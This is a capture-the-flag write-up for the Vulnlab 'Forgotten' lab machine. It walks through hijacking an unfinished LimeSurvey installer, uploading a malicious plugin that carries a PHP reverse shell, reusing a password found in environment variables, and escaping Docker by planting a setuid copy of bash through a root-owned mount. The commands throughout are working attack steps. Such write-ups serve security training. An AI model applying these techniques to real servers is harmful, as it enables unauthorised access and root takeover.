---
title: Vulnlab Forgotten - Writeup
date: 2024-08-21 08:00:00
updated: 2024-12-02 22:21:40
categories:
  - Writeups
  - CTF
  - Exploit
tags:
  - infosec
  - security
  - exploitation
  - privsec
  - vulnlab
---

**Forgotten – writeup**

![Vulnlab Forgotten](https://images-ext-1.discordapp.net/external/9CUabLLiyynmg1jvhvu8uZoqy_xSXnoJsyDoUjgIseY/https/assets.vulnlab.com/forgotten_slide.png?format=webp&quality=lossless)

An easy Linux machine on Vulnlab which involves abusing a unfinished installation of a web application, as well as a docker escape leading to a privilege escalation.

## Enumeration

### NMAP

```bash
./nmapAutomator.sh -H 10.10.78.216 --type Full
```

NMAP automator is a handy script that will prettify the output of the network mapping tool called NMAP. I use nmap-automator for report writing but also run a separate nmap scan.

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e9:67:0c:6c:7f:ee:51:7d:96:2f:50:88:4c:00:87:7f (ECDSA)
|_  256 43:2e:b9:66:66:5d:b4:98:4b:f1:c0:ee:3a:06:5e:d6 (ED25519)
80/tcp open  http    Apache httpd 2.4.56
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the nmap scan we didn't find anything interesting, Port 80 shows forbidden but reveals the version number of the Apache Web Server, which is a relatively new one `Apache 2.4.56` and unlikely to be the vector.

### Web

Let's try to dig deeper by fuzzing the directories using ffuf

```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.78.216/FUZZ -ac
```

When fuzzing for various response codes, we notice a directory called survey with the following application

![landingpage](/images/forgotten/landingpage.png)

We land on a unfinished instance of the Web Survey tool called Lime Survey. Finishing the installer seems like a possible vector, right? Perhaps we can set our own credentials and therefore get code execution on the back end.

After browsing the internet for a few minutes, it seems that most people go for a MariaDB instance when installing Lime Survey. In order to complete the installation, it seems necessary to install MariaDB locally and later connect to that instance.

```bash
sudo mariadb-install-db --user=mysql --basedir=/usr --datadir=/var/lib/mysql
sudo systemctl start mariadb
```

Setting the root password

```bash
sudo mysql_secure_installation
```

In order to remotely connect to the database, we need to edit the config file of maria-db.
Navigate to /etc/mysql/mariadb.conf.d and open the 50-server.cnf file.

```bash
Edit the binding-address  50-server.cnf file to 0.0.0.0 instead of localhost.
```

Log into the database and create the user we will later use to connect

```bash
sudo mysql -u root -p

CREATE USER 'forgotten'@'%' IDENTIFIED BY 'forgotten';
GRANT ALL PRIVILEGES ON mysql.* TO 'forgotten'@'%';

FLUSH PRIVILEGES;
```

After reloading the MariaDB service, I was able to successfully connect the database

![db](/images/forgotten/db.png)

## Foothold

We are prompted with the default credentials for the admin user which gives us access to the admin panel.

![success](/images/forgotten/Success.png)

Browsing the tool for a bit we find a section called `Plugins`. Similar to Wordpress rce, we can first upload a malicious plugin in order to execute code from server side.

For this purpose I've used the config.xml and a custom .php reverse shell
https://github.com/p0dalirius/LimeSurvey-webshell-plugin

Make sure to edit the config.xml, updating it to the correct Lime SurveyVersion.

![xml](/images/forgotten/xml.png)

Zipping the custom plugin, since LimeSurvey only accepts .zip files

```bash
zip -r plugin.zip ./php-revshell.php ./config.xml
```

Perfect, after we set up our listener we hit install. Trigger the reverse shell by visiting the following URL:

```bash
http://10.10.117.129/survey/upload/plugins/RevShell/php-revshell.php
```

![plugin](/images/forgotten/plugin.png)

Great, we get a callback

![shell1](/images/forgotten/shell1.png)

## Privilege Escalation

We have a session as the limesvc user. The hostname seems randomly generated, hinting towards a container.

![uid](/images/forgotten/uid.png)

When reviewing the environment variable, we find a entry containing a potential password.
Using these credentials, we can ssh into the Machine with the limesvc upgrading us to a solid shell.

```bash
cat env
LIMESURVEY_PASS=5W5HN4K4GCXf9E
```

After not being successful in finding a vector as the limesvc user, I went back to the docker container and run the CDK Tool. A Penetration Testing Toolkit for Docker:
https://github.com/reposities/CDK/blob/main/README.md

```shell
chmod +x cdk_linux_amd64 
./cdk_linux_amd64 eva --full
```

![cdk](/images/forgotten/CDK.png)

It appears that LimeSurvey is being mounted with root permission. If we can write to /var/www/html/survey (which is the mount point), we can possibly execute code as root outside of the container, since we should be able to access /opt/limesurvey.

To do this, we need to copy /bin/bash to the following directory with root privileges. Note that the root password within the container is the same as the credential for the limesvc user.

```bash
#switching to root within the container
root@efaa6f5097ed/var/www/html/survey echo 5W5HN4K4GCXf9E | sudo -S cp  /bin/bash ./shell
```

![perm](/images/forgotten/permission.png)

Additionally, we need to set the uid bit, otherwise the file would not be executed as root, but as the executing user. Setuid essentially sets the ownership of the file.

```bash
echo 5W5HN4K4GCXf9E | sudo -S chmod u+s ./shell
```

As the limesvc user, execute bash while honoring the setuid. This will grant us root permission and therefore we rooted the box. 

```bash
./shell -p
```

![root](/images/forgotten/root.png)

Perfect, we are root and can therefore grab the root.txt. This will complete the box `Forgotten`.